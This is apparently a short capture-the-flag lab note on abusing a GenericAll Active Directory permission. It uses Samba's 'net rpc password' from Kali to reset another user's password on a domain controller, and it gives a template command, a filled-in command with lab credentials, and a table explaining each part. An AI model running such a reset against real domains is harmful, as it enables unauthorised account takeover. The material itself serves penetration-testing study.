

```
net rpc password "TargetUser" "newPassword" -U "DOMAIN"/"USER-with-GenericAll"%"password" -S "IP-Domain-Controller"
```

```
net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.27.140
```

Think of this command as the "Linux-to-Windows" way of performing a remote password reset. 
Running this from your Kali machine (and not from inside the Windows shell), we are using the **Samba** suite to talk to the Domain Controller using the **RPC (Remote Procedure Call)** protocol

| **Component**           | **What it does**                                                                                        |
| ----------------------- | ------------------------------------------------------------------------------------------------------- |
| **`net rpc password`**  | The specific Samba tool and action (change a password via RPC).                                         |
| **`"michael"`**         | **Target**: The account whose password you want to change.                                              |
| **`"password"`**        | **New Payload**:  new password for Michael.                                                             |
| **`-U "admin..."`**     | **Credentials**: Telling the server, "I am Olivia, and here is my password."                            |
| **`"olivia"%"ich..."`** | **Separator**: Samba uses the `%` symbol to separate the username from the password in a single string. |
| **`-S 10.129.27.140`**  | **Server**: IP address of the Domain Controller you are sending this request to.                        |
